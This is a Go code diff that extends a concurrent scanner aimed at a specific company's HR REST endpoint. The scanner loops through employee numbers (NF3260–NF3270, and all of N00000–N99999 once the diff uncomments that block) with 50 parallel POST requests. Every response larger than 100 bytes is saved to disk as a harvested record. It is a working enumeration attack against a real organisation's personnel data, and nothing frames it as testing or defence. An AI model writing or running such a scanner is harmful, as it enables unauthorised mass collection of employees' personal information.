@@ -6,6 +6,8 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"os"
+	"path"
 	"sync"
 )
 
@@ -13,7 +15,7 @@ import (
 const maxConcurrency = 50
 
 // 请求函数
-func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}) {
+func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}, filename string) {
 	defer wg.Done()
 
 	// 控制并发数量
@@ -21,7 +23,9 @@ func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}) {
 	defer func() { <-sem }()
 	// Define the request body (empty JSON data)
 	jsonData := []byte(`{}`)
-
+	lastSegment := path.Base(url)
+	filename_id := filename + "_id.txt"
+	filename_body := filename + "_body.txt"
 	// Create a new HTTP request
 	req, err := http.NewRequest("POST", url, bytes.NewBuffer(jsonData))
 	if err != nil {
@@ -49,8 +53,8 @@ func fetchURL(wg *sync.WaitGroup, url string, sem chan struct{}) {
 	body, _ := io.ReadAll(resp.Body)
 	if resp.StatusCode == 200 && len(body) > 100 {
 		fmt.Printf("[+] 有效 URL: %s\n", url)
-		saveToFile("valid_urls.txt", url+"\n")
-		saveToFile("response_bodies.txt", fmt.Sprintf("URL: %s\nResponse: %s\n\n", url, string(body)))
+		saveToFile(filename_id, lastSegment+"\n")
+		saveToFile(filename_body, fmt.Sprintf("Response: %s\n", string(body)))
 	}
 }
 
@@ -76,15 +80,17 @@ func IworkGet() error {
 	for i := 3260; i <= 3270; i++ {
 		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/NF%04d", i)
 		wg.Add(1)
-		go fetchURL(&wg, url, sem)
+		filename := "NF0000-NF4000"
+		go fetchURL(&wg, url, sem, filename)
 	}
 
-	// // 扫描范围2: N00000 - N99999
-	// for i := 0; i <= 99999; i++ {
-	// 	url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/N%05d", i)
-	// 	wg.Add(1)
-	// 	go fetchURL(&wg, url, sem)
-	// }
+	// 扫描范围2: N00000 - N99999
+	for i := 0; i <= 99999; i++ {
+		url := fmt.Sprintf("https://it.ofilm.com/hr/hr-ks/rest/kskinsfolk/kskinsfolk/findUserNoNcHrEK/N%05d", i)
+		wg.Add(1)
+		filename := "N00000-N99999"
+		go fetchURL(&wg, url, sem, filename)
+	}
 
 	wg.Wait() // 等待所有 goroutine 完成
 	fmt.Println("[*] 扫描完成")
